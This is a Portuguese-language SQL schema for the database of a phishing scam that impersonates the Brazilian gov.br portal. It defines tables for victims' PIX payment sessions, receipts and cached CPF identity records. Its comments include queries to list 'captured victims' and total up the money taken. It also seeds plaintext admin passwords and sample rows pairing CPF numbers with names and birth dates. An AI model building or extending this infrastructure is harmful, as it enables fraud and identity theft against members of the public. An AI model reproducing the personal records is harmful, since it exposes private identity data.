-- ============================================
-- SCHEMA DO BANCO — PHISHING GOV.BR
-- Cole isso no SQL Editor do Supabase
-- Supabase → SQL Editor → New Query → Run
-- ============================================

-- 1. Tabela de administradores
CREATE TABLE admins (
  id SERIAL PRIMARY KEY,
  username TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  secondary_password_hash TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

INSERT INTO admins (username, password_hash, secondary_password_hash)
VALUES ('admin', 'admin123', 'sec123');

-- 2. Configurações do sistema (PixVault, logo)
CREATE TABLE settings (
  key TEXT PRIMARY KEY,
  value TEXT
);

INSERT INTO settings (key, value) VALUES
  ('pixvault_client_id', ''),
  ('pixvault_client_secret', ''),
  ('logo_url', ''),
  ('logo_size', '0');

-- 3. Sessões PIX das vítimas
CREATE TABLE pix_sessions (
  id SERIAL PRIMARY KEY,
  token TEXT UNIQUE NOT NULL,
  cpf TEXT NOT NULL,
  nome TEXT,
  data_nascimento TEXT,
  genero TEXT,
  pix_code TEXT,
  amount DECIMAL(10,2) DEFAULT 198.38,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 4. Pagamentos gerados
CREATE TABLE payments (
  id SERIAL PRIMARY KEY,
  session_token TEXT REFERENCES pix_sessions(token),
  pix_hash TEXT,
  pix_code TEXT,
  amount DECIMAL(10,2),
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 5. Comprovantes de pagamento
CREATE TABLE receipts (
  id SERIAL PRIMARY KEY,
  cpf TEXT NOT NULL,
  file_name TEXT,
  file_url TEXT,
  uploaded_at TIMESTAMPTZ DEFAULT NOW()
);

-- 6. Chaves de API para consulta CPF
CREATE TABLE cpf_api_keys (
  id SERIAL PRIMARY KEY,
  key_name TEXT NOT NULL,
  api_key TEXT UNIQUE NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 7. Cache de CPFs consultados
CREATE TABLE cpf_cache (
  cpf TEXT PRIMARY KEY,
  nome TEXT,
  data_nascimento TEXT,
  genero TEXT,
  consultado_em TIMESTAMPTZ DEFAULT NOW()
);

-- Dados de exemplo
INSERT INTO cpf_cache (cpf, nome, data_nascimento, genero) VALUES
  ('12345678909', 'Daiana Lassolli', '2000-04-27', 'F'),
  ('41359643893', 'Anderson Marques da Silva', '1992-07-16', 'M'),
  ('75499690782', 'Carlos Henrique Barrocas', '1961-10-01', 'M');

-- 8. Logs de auditoria
CREATE TABLE admin_logs (
  id SERIAL PRIMARY KEY,
  action TEXT,
  ip TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- ============================================
-- CONSULTAS ÚTEIS
-- ============================================

-- Ver vítimas capturadas:
-- SELECT * FROM pix_sessions ORDER BY created_at DESC;

-- Ver total arrecadado:
-- SELECT SUM(amount) as total_potencial FROM payments;

-- Ver comprovantes enviados:
-- SELECT cpf, file_name, uploaded_at FROM receipts ORDER BY uploaded_at DESC;
